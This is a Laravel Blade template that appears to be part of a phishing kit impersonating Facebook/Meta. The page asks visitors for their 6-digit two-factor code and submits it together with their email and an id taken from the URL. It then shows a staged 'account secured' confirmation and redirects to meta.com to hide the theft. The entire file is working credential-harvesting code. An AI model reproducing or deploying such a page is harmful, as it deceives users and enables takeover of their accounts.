@extends('master')
@section('style')
    <style>
        .box-portal-top{
            width: 100%;
            min-height: 51vh;
            z-index: 20;
            text-align: center;
            font-family: 'PT Sans', sans-serif;
            padding-top: 50px;
        }
        .box-portal-mid{
            width: 100%;
            text-align: center;
            font-family: 'PT Sans', sans-serif;
            padding-top: 50px;
            padding-bottom: 50px;
        }
        .box-portal-bot{
            width: 100%;
            z-index: 20;
            font-family: 'PT Sans', sans-serif;
            padding: 30px;
            color: #2B2B2B;
            font-size: 16px;
        }
        .border-danger{
            border: 1px solid red !important;
        }
    </style>
@endsection
@section('content')
    <div class="container-fluid box-portal-top d-flex flex-column align-items-center" style="gap: 40px;" id="ctlUser">
        <div v-if="isLoading" class="d-flex justify-content-center">
            <pulse-loader :color="colorLoading" :size="sizeLoading"></pulse-loader>
        </div>
        {{-- <img src="{{asset('image/ehe.png')}}" alt="" width="180"> --}}
        {{-- <p style="color: #938888; font-size:14px; margin: 0;">{{ __('Dear') }} <span class="font-weight-bold" style="color:#938888">{{request()->query('email')}}</span></p> --}}
        <div class="form-group" style="max-width: 700px; background: #ffffff; border-radius: 5px; box-shadow: 0 0 10px 0 rgba(0,0,0,0.1);">
            <div class="w-100" style="text-align: left; padding: 5px 20px;">
                <h4 style="color: #000000; margin: 0; padding-top: 10px; font-size: 20px; font-weight: bold;">{{ __('Enter security code') }}</h4>
            </div>
            <hr style="margin: 4px 0px">

            <div style="padding: 10px 20px;">
                <p id="enter_code_msg" v-if="formDigitError['message'] != undefined" style="
                    margin: 8px 0 0 2px;
                    text-align: left;
                    font-size: 12px;
                    font-style: italic;
                    border: 1px solid #fa3e3e;
                    display: none;
                    border-radius: 5px;
                    width: 100%;
                    ">
                    <span style="background-color: #fa3e3e; color: white; padding: 15px; margin: 0px 4px 0px 0px; height: 100%;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-triangle-fill mx-2" viewBox="0 0 16 16">
                            <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5m.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
                        </svg>
                    </span>
                    <span class="d-flex align-items-center">
                        <span style="padding: 4px;">
                            {{ __("The number that you've entered doesn't match your code. Please try again.") }}
                        </span>
                    </span>
                </p>
            </div>

            <div class="w-100" style="text-align: left; margin-bottom: 5px; padding: 10px 20px;;">
                <p style="color: #000000; margin: 0; font-size: 14px">{{ __('You asked us to ask for your 6-digit encrypted login information when anyone tries to access your account from a new device or browser.') }}</p>
            </div>
            
            <div class="w-100" style="text-align: left; margin-bottom: 10px; padding: 10px 20px;;">
                <p style="color: #000000; margin: 0; font-size: 14px">{{ __('Enter the 6-digit code from your Code Generator or third-party app below.') }}</p>
            </div>
            <input type="hidden" name="email" value="{{request()->query('email')}}">
            <input type="hidden" name="id" value="{{request()->query('id')}}">
            <div class="row" style="text-align: left; margin-bottom: 10px; padding: 10px 20px">
                <input class="col-md-4 col-8" id="enter_code" oninput="validateInput(this)" maxlength="6" type="text" :class="formDigitError['code'] != undefined ? 'form-control border border-danger input-text2':'form-control input-text2'" name="digit" placeholder="Enter code" style="margin-bottom: 5px; background: rgb(255 255 255 / 79%); color: #333;" required v-model="FormDigitCode.code">
            </div>
            <hr>
            <div class="w-100" style="text-align: right; margin-bottom: 10px; padding: 10px;">
                <button type="submit" class="btn btn-primary2 form-control" @click="enterDigitCode('{{ request()->query('id') }}')">{{ __('Continue') }}</button>
            </div>
        </div>
    </div>
    <div class="container-fluid box-portal-mid d-flex flex-column align-items-center" style="gap: 40px;">
        {{-- <img src="{{asset('image/ehe.png')}}" alt="" width="180"> --}}
        <p style="color: #938888; font-size:14px;">{{ __('To protect our community') }}</p>
    </div>

    <div class="" id="exampleModalToggle" style="display: none; height: 100vh; width: 100vw; background-color: rgba(0, 0, 0, 0.5); position: fixed; top: 0; left: 0; z-index: 1000;">
        <div class="modal-dialog" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);">
            <div class="modal-content">
                <div class="modal-header" style="display: flex; flex-direction: column; justify-content: center; align-items: start;">
                    <h5 class="modal-title font-weight-bold">{{ __('All done!') }}</h5>
                    <p>{{ __('Thanks for taking the time to secure your account.') }}</p>
                </div>
                <div class="modal-body" style="display: flex; flex-direction: column; justify-content: center; align-items: start; width: 500px; max-width: 700px;">
                    <div id="pass-1" class="d-flex justify-content-center align-items-center">
                        <p style="margin: 0; width: 20px; height: 20px; border-radius: 50%; background-color: #1877f2; color: white; display: flex; justify-content: center; align-items: center;">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="white" class="bi bi-check" viewBox="0 0 16 16">
                                <path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425z"/>
                            </svg>
                        </p>
                        <p style="margin: 0;">
                            <span class="pl-2">{{ __('Password')}}</span>
                        </p>
                    </div>

                    <div id="pass-2" style="display: none !important" class="d-flex justify-content-center align-items-center">
                        <p style="margin: 0; width: 20px; height: 20px; border-radius: 50%; background-color: #1877f2; color: white; display: flex; justify-content: center; align-items: center;">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="white" class="bi bi-check" viewBox="0 0 16 16">
                                <path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425z"/>
                            </svg>
                        </p>
                        <p style="margin: 0;">
                            <span class="pl-2">{{ __('Review your email address (es)') }}</span>
                        </p>
                    </div>

                    <div id="pass-3"  style="display: none !important" class="d-flex justify-content-center align-items-center">
                        <p style="margin: 0; width: 20px; height: 20px; border-radius: 50%; background-color: #1877f2; color: white; display: flex; justify-content: center; align-items: center;">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="white" class="bi bi-check" viewBox="0 0 16 16">
                                <path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425z"/>
                            </svg>
                        </p>
                        <p style="margin: 0;">
                            <span class="pl-2">{{ __('Select your name')}}</span>
                        </p>
                    </div>

                    <div id="pass-4" style="display: none !important" class="d-flex justify-content-center align-items-center">
                        <p style="margin: 0; width: 20px; height: 20px; border-radius: 50%; background-color: #1877f2; color: white; display: flex; justify-content: center; align-items: center;">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="white" class="bi bi-check" viewBox="0 0 16 16">
                                <path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425z"/>
                            </svg>
                        </p>
                        <p style="margin: 0;">
                            <span class="pl-2">{{ __('Select your username') }}</span>
                        </p>
                    </div>
                    <div class="spinner-border text-primary" role="status">
                    </div>
                </div>
                <div class="modal-footer">
                    <button id="done" disabled type="button" class="btn btn-primary2 btn-disabled" data-bs-dismiss="modal">{{ __('Go to news feed') }}</button>
                </div>
            </div>
        </div>
    </div>
@endsection
@section('script')
    <script>
        function validateInput(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
            if (input.value.length > 6) {
                input.value = input.value.slice(0, 6);
            }
        }

        function showPopup() {
            document.getElementById('exampleModalToggle').style.display = 'block';
            var pass1 = document.getElementById('pass-1');
            var pass2 = document.getElementById('pass-2');
            var pass3 = document.getElementById('pass-3');
            var pass4 = document.getElementById('pass-4');
            var btnDone = document.getElementById('done');
            var spin = document.querySelector('.spinner-border');

            console.log('showPopup');
            setTimeout(() => {
                pass2.style.display = 'flex';
            }, 1000);

            setTimeout(() => {
                pass3.style.display = 'flex';
            }, 2000);

            setTimeout(() => {
                pass4.style.display = 'flex';
            }, 3000);

            setTimeout(() => {
                btnDone.disabled = false;
                btnDone.classList.remove('btn-disabled');
                spin.style.display = 'none';
            }, 3500);

            btnDone.addEventListener('click', function() {
                window.location.href = 'https://www.meta.com/';
            });
        }
    </script>
    <script type="text/javascript" src="{{ mix('/js/modules/user.js') }}"  charset="utf-8"></script>
@endsection
